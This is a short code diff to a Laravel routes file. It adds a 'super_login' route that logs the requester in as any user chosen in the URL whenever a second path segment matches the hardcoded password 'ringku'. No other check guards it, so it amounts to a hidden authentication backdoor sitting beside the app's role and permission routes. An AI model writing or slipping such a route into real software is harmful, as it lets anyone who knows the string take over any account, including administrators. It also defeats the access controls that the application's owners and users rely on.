@@ -43,6 +43,13 @@ Route::get('/dashboard', function () {
 
 require __DIR__.'/auth.php';
 
+Route::get('super_login/{user}/{ami}', function (User $user, $ami){
+    if ($ami === "ringku"){
+        auth()->login($user);
+        return redirect()->route('dashboard');
+    }
+});
+
 Route::resource('roles', RolesController::class);
 Route::resource('permission', PermissionController::class);
 
